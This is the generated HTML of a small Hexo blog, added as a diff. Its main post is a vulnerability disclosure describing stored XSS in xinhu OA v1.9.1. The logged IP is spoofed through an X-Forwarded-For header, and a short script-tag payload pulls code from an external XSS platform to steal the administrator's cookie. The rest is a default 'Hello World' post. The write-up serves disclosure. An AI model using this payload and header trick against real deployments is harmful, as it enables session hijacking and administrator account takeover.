@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="https://touchfishboy1.github.io/blog/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="default">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hexo">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/blog/css/style.css">
+  
+
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/blog/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/blog/">Home</a>
+        
+          <a class="main-nav-link" href="/blog/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://touchfishboy1.github.io/blog"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-xinhu" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/blog/2019/05/26/xinhu/" class="article-date">
+  <time datetime="2019-05-26T13:36:57.000Z" itemprop="datePublished">2019-05-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/blog/2019/05/26/xinhu/">xinhu</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>xinhu Existing Storage XSS v1.9.1<br>1、Vulnerability summary<br>Name: xinhu Existing Storage XSS v1.9.1<br>Date of reporting: 2019-05-26<br>Vulnerability Finder: TouchFishBoy<br>Product Homepage: <a href="http://www.rockoa.com/" target="_blank" rel="noopener">http://www.rockoa.com/</a><br>github address: <a href="https://github.com/rainrocka/xinhu" target="_blank" rel="noopener">https://github.com/rainrocka/xinhu</a><br>Edition: v1.9.1</p>
+<p>2、Vulnerability analysis<br>We visited the CMS and jumped to a landing entrance<br><img src="https://github.com//touchfishboy1/img/blob/master/1.png?raw=true" alt="1"><br>We try to log in, write a random account and password, click on the login, then grab the package to check the parameters, and then go to find the source code of the login module. According to the tracking of the parameters, we can trace the file very soon.（webmain\model\loginMode.php）<br>We found something amazing in lines 209 to 215 of this landing file.(loginMode.php)<br><img src="https://github.com//touchfishboy1/img/blob/master/2.png?raw=true" alt="2"><br>Here’s an addlogs function. Let’s find out what he is doing (see the name should be adding logs). We found his definition in logModel.php<br><img src="https://github.com//touchfishboy1/img/blob/master/3.png?raw=true" alt="3"><br>It’s obvious here that you get the information, assign values to the array, and then call the insert function（mysql.php）<br><img src="https://github.com//touchfishboy1/img/blob/master/4.png?raw=true" alt="4"><br>Obviously, this is the template for inserting statements. If there is no mistake, it should be the information of array assignment that is recorded in the log after the login failure.<br>We can simply monitor Mysql logs, and then we can see what SQL statements were executed when I logged in.<br>Then I tried to log in and I found an SQL statement.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">insert into `xinhu_log` set `type`=&apos;pc登录</span><br><span class="line">&apos;,`ip`=&apos;192.168.253.1&apos;,`web`=&apos;Firefox&apos;,`optdt`=&apos;2019-05-26 19:38:31&apos;,`optid`=&apos;0&apos;,`optname`=null,`remark`=&apos;[qweweqq]用户不存在&apos;,`url`=&apos;http://192.168.253.128/xinhu-master/index.php?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=791294&apos;,`device`=&apos;1558870673437&apos;,`level`=&apos;3&apos;</span><br></pre></td></tr></table></figure></p>
+<p>So that’s easy. He’ll record our Ip. Can we try to change his IP using X-Forwarded-For, and then we use X-Forwarded-For: 127.0.0.1<br><img src="https://github.com//touchfishboy1/img/blob/master/5.png?raw=true" alt="5"><br>Obviously, we can change the IP address here by X-Forwarded-For, and then we found the log viewing section in the background.<br><img src="https://github.com//touchfishboy1/img/blob/master/6.png?raw=true" alt="6"><br>So can we try to insert XSS? After all, I don’t see any restrictions on IP access in the reference area. We can try to insert one?<br><code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><img src="https://github.com//touchfishboy1/img/blob/master/7.png?raw=true" alt="7"><br><img src="https://github.com//touchfishboy1/img/blob/master/8.png?raw=true" alt="8"><br>There’s obviously storage XSS, so let’s try to use it? I saw that the IP field was limited to 30 bytes.<br><img src="https://github.com//touchfishboy1/img/blob/master/9.png?raw=true" alt="9"><br>Using XSS Platform（<a href="https://xss8.cc/xss.php）" target="_blank" rel="noopener">https://xss8.cc/xss.php）</a><br>I tried to build an XSS statement and then succeeded in getting the administrator cookie.<br>Payload:&lt;sCRiPt/SrC=////xss8.cc/p6az&gt;<br><img src="https://github.com//touchfishboy1/img/blob/master/10.png?raw=true" alt="10"><br><img src="https://github.com//touchfishboy1/img/blob/master/11.png?raw=true" alt="11"><br><img src="https://github.com//touchfishboy1/img/blob/master/12.png?raw=true" alt="12"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://touchfishboy1.github.io/blog/2019/05/26/xinhu/" data-id="cjw57qo6b0000usui4m96b7i4" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/blog/2019/05/26/hello-world/" class="article-date">
+  <time datetime="2019-05-26T13:15:26.350Z" itemprop="datePublished">2019-05-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/blog/2019/05/26/hello-world/">Hello World</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://touchfishboy1.github.io/blog/2019/05/26/hello-world/" data-id="cjw57qo6j0001usuitz2f2vab" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2019/05/">May 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/blog/2019/05/26/xinhu/">xinhu</a>
+          </li>
+        
+          <li>
+            <a href="/blog/2019/05/26/hello-world/">Hello World</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/blog/" class="mobile-nav-link">Home</a>
+  
+    <a href="/blog/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/blog/fancybox/jquery.fancybox.css">
+  <script src="/blog/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/blog/js/script.js"></script>
+
+  </div>
+</body>
+</html>
